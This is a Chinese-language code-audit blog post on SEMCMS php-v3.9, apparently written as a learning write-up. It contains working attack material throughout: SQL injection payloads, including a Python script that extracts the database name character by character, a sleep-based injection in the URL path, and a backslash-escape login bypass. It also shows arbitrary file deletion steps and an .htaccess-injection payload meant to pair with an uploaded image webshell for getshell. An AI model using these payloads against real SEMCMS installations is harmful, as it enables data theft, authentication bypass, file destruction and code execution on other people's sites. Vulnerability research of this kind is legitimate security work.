---
title: SEMCMS php-v3.9 代码审计
categories: PHP代码审计
---
# 前言
审计！

# 前台SQL注入之一
先看一下前台

![](https://img-blog.csdnimg.cn/9adee2b2938949abac2f264a55fc64bc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
每个页面都有ID参数

<!--more-->

有可能存在sql看一下代码

![](https://img-blog.csdnimg.cn/019a80b6f7ba4c38a8ee1b4e5b57f1a1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Include/web_inc.php

![](https://img-blog.csdnimg.cn/6c2bf0e7d10a4b1e8b4f71e25292f0f5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跟进
Include/contorl.php

![](https://img-blog.csdnimg.cn/7d78bf3bb0424d82b6a3b17e17b9fc4f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
所有通过 GET 得到的参数经过`Verify_str`函数调用 `inject_check_sql` 函数进行参数检查过滤，如果匹配黑名单，就退出

但是没过滤if ascii substr information sleep等还有双引号

如果找出这样的语句

1.	双引号包裹 或者 数字拼接
2.	以单引号包裹但是以POST方式或其他方式传参

就有可能存在sql注入

全局搜索

>select.*from.*where  //开启正则

![](https://img-blog.csdnimg.cn/68f240d6b7524433b8ba6fdf16c36a96.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到一个language参数直接拼接上去

跟进：Include/web_inc.php

![](https://img-blog.csdnimg.cn/320f988292ad491ca855350926783965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
POST提供参数，虽然可以绕过verify_str的检查，但是又调用一个新的函数 `test_input()`

![](https://img-blog.csdnimg.cn/01ab2729fb69471784ebfee5fb93a0c0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
替换% 删除反斜杠 html转义字符，对注入没什么影响

接下来进行测试：

随便找个包含 `web_inc.php` 的页面进行 `post传languageid参数`

直接构造：
>languageID=1 and ascii(substr(database(),1,1))^109

![](https://img-blog.csdnimg.cn/69283c52ad334447ab23971450417634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


写个脚本：

```php
import requests

url = "http://192.168.42.241/"
database=""

for i in range(1,6):
    for j in range(97,127):
        payload = "1 and ascii(substr(database(),{i},1))^{j}".format(j=j,i=i)

        data = {"languageID":payload}
        #print(payload)
        c=requests.post(url=url,data=data).text
        if "Empty!" in c:
            database+=chr(j)
print(database)

```

# 前台SQL注入之二
Include/web_inc.php

![](https://img-blog.csdnimg.cn/3e287318f95142238cdd76f82ed528b7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
解释一下`$_SERVER`一些参数

>http://www.biuuu.com/index.php?p=222&q=biuuu

结果：
```
$_SERVER["QUERY_STRING"] = "p=222&q=biuuu"
$_SERVER["REQUEST_URI"] = "/index.php?p=222&q=biuuu"
$_SERVER["SCRIPT_NAME"] = "/index.php"
$_SERVER["PHP_SELF"]     = "/index.php"

$_SERVER["QUERY_STRING"]获取查询语句，实例中可知，获取的是?后面的值
$_SERVER["REQUEST_URI"] 获取http://www.biuuu.com后面的值，包括/
$_SERVER["SCRIPT_NAME"] 获取当前脚本的路径，如：index.php
$_SERVER["PHP_SELF"] 当前正在执行脚本的文件名
```

跟进 `web_language_ml` 函数

![](https://img-blog.csdnimg.cn/8bceb2eb9f374930904c95c2b2ed1c61.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

可控参数urls2，单引号闭合还没有过滤

构造：
```
/index.php/'or(sleep(3))or'   //空格传进去的时候变成%20
```

# 后台SQL注入之一
又发现一处sql语句，符合条件

![](https://img-blog.csdnimg.cn/4a38e8fa08f04bb291a047c7fce8f093.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
向上追溯

![](https://img-blog.csdnimg.cn/c05a54d6238e4e92ad3f7735bbc2e66a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`$lgid参数` 可控，成功注入

![](https://img-blog.csdnimg.cn/99ed85873148430c87b252420ef8a40f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
# 后台SQL注入之二
Include/contorl.php

![](https://img-blog.csdnimg.cn/b021c515018443a98db4a7d2594f7645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

这里先看第一个条件 `$fl==f` ，且 `$str` 满足上面说的注入要求，那么全局搜索谁调用了`CheckInfo` 函数

![](https://img-blog.csdnimg.cn/b470c36284ca463b95e3fae6c06381b1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
经过筛选，有f参数，且有可控参数 `$PID` ($str直接带入数据库)

跟进：l4RiMm_Admin/SEMCMS_Function.php  是一个后台地址

那么向上寻找`$PID`参数

![](https://img-blog.csdnimg.cn/b936f812ed744b8ea43273d8e2e88a8e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
接下来发现想要利用这个函数需要满足特定的条件

首先`$Class ==add 且$category_name参数不为空`

![](https://img-blog.csdnimg.cn/de33350311524b9b9bdc3be6f1b040a7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
接着向上：
看到还有一个条件是 `$CF==category`，且同时对传进来的参数进行test_input处理，且发现可控参数`$PID` 以 POST 方式传入

![](https://img-blog.csdnimg.cn/e02df3c1e43a4dfe9cacac57113e7c5a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
总结利用条件：
1.	$CF==category
2.	$Class ==add
3.	$category_name参数不为空

我们已经知道 `$PID` 参数传入方式，那么看这三个参数是怎么来的：

`$CF` 和 `$Class`都是通过 GET 得到

![](https://img-blog.csdnimg.cn/b2be2725772c49bd97b86c4ad6ad1597.png#pic_center)
$category_name是通过POST得到

![](https://img-blog.csdnimg.cn/8d03a73791114f81a36b68f6b966f725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
向上追溯谁调用了这个文件

![](https://img-blog.csdnimg.cn/55b6b071bf694da48d6662dad4e36b59.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
再向上追溯

![](https://img-blog.csdnimg.cn/721a5f5c376b476c9a4756197d26acce.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现众多文件进行调用，那么在后台主页直接进行构造：

![](https://img-blog.csdnimg.cn/73807f8e75754d34845bc458ecbf195a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

# 前台SQL绕过登录
发现检查是否登陆函数

![](https://img-blog.csdnimg.cn/119fbd84d3d04c80b397ffb3ae5d2c99.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
这里虽然是单引号闭合且进行sql检查，但是能这样构造：

>Useradmin: 123\\\\
Userpass: or 1#

这样经过处理的sql语句变成了
```
select * from sc_user where user_admin='123\' and user_ps='or 1#'
```
将单引号转义成字符

构造cookie直接访问后台页面：

![](https://img-blog.csdnimg.cn/1fa9cc97d36845e5b8d832137c0473ab.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

这里我有一个想法，如果存在类似上面的sql语句是这样的
```
select * from users where user_name='$a' and user_pas='$b';
```
两个$a $b 参数都可控且过滤不严，就出现上面这样情况

# 任意文件删除
关键字： unlink

l4RiMm_Admin/Include/function.php

![](https://img-blog.csdnimg.cn/248e041d36704ec48eca93dc192ada7d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
向上查看调用，这三个一个道理，分析一个就行了

![](https://img-blog.csdnimg.cn/22cdfa7aad594966a22e9a4bdc1d9575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/f521066dd34a4518b8d5c2ed1cdfe365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
向上追溯参数都可控，$AID要求为数组

![](https://img-blog.csdnimg.cn/0ee170af523040509788253041777ba0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
那么看一下这个sql语句执行的是什么结果

![](https://img-blog.csdnimg.cn/fc988573f03444318a75d4888732abb5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

结合上面，我们将 `$area_arr` 传入作为`ID`(where ID in)带入sql查询，如果 `link_image` 不为空将其删除

这样构造，将7处作为可控

![](https://img-blog.csdnimg.cn/099eb7f6c2ba47d8b301ab37a5f1cfe5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
在同级目录下新建test.txt

![](https://img-blog.csdnimg.cn/d1e23ad31c474e35a5007d1f8a10d9be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
构造：十六进制都可以

![](https://img-blog.csdnimg.cn/89594e29b76741b283f03e6733ab3af3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跨目录删除文件也可以

# 后台Getshell
关键字：file_get(put)_contents

后台先传一个图片马

![](https://img-blog.csdnimg.cn/1e2fe00a31d24f1e96c090a99c27da5e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
/Images/default/21081306504899.png

通过 `file_put_contents()` 函数，找到一个函数

```php
function Mbapp($mb,$lujin,$mblujin,$dirpaths,$htmlopen){
 
  if ($htmlopen==1){$ml="j";}else{$ml="d";}

   $template="index.php,hta/".$ml."/.htaccess"; //开始应用模版
   $template_mb=explode(",",$template);

   for($i=0;$i<count($template_mb);$i++){

         $template_o = file_get_contents($mblujin.'Templete/'.$mb.'/Include/'.$template_mb[$i]);
         
         $templateUrl = $lujin.str_replace("hta/".$ml."/","", $template_mb[$i]);
         $output = str_replace('<{Template}>', $mb, $template_o);
         $output = str_replace('<{dirpaths}>', $dirpaths, $output);

         file_put_contents($templateUrl, $output);
         
           }
}
```

找到一个参数可控的调用处：

XkVOaf_Admin/SEMCMS_Function.php

![](https://img-blog.csdnimg.cn/a125120405b343428457ad1eebd84277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
来分析一下这个方法

![](https://img-blog.csdnimg.cn/e39584bf1e8345c782c52de123e8c74a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
这里`file_get_contents()` 和 `str_replace()` 就是从模板目录下提取index.php和htaccess文件然后替换`<{Template}>`写入到主目录下的index.php和htaccess

模板目录：

![](https://img-blog.csdnimg.cn/538910f653c64b1b816d3d9973707bf2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/6d3ec81a04e341fdb13e2bffd85a019c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
注意：这里的`$mb虽然可控` 但是由于后面文件的限定，所以现在的情况是：
`限定/可控/限定`  而且这个文件还是要存在才能接着进行下面的操作，不然你怎么把`<{Template}>`替换并写入

这里就可以 `先构造不存在的下级目录然后再通过../来返回到原来的目录`
例如：
```
../ Templete/';phpinfo();#/../default/Include/xxx
```
那么利用这点尝试getshell，所以有两个文件可以进行写入

先分析写入一句话到index.php的可行性：

如果  
```
<{Template}>=$mb=';phpinfo();#  
```
那么写入文件后是这样：闭合单引号即可利用

![](https://img-blog.csdnimg.cn/0ab025d0066b48bba826ade4a66eed9a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
但是向上追踪的时候发现

![](https://img-blog.csdnimg.cn/c420bc2d15064a06b9c0810659d8d554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
调用了这个函数，那么我们的单引号无法写入，所以index.php这条路走不通

尝试`.htacces`
这个文件的利用不用多说，尝试构造

```
../Templete/123%0aSetHandler application/x-httpd-php%0a%23/../../default/xxx
```
payload：

```
/XkVOaf_Admin/SEMCMS_Top_include.php?CF=template&mb=123%0aSetHandler application/x-httpd-php%0a%23/../../default
```

再配合着刚才上传的图片马，理论能getshell


但是我没利用成功，可能是哪个文件没设置好吧，不过也开阔了思路

Phpstudy记得开启

![](https://img-blog.csdnimg.cn/ad62c4b6b1c5416498c926a73dd6eea9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


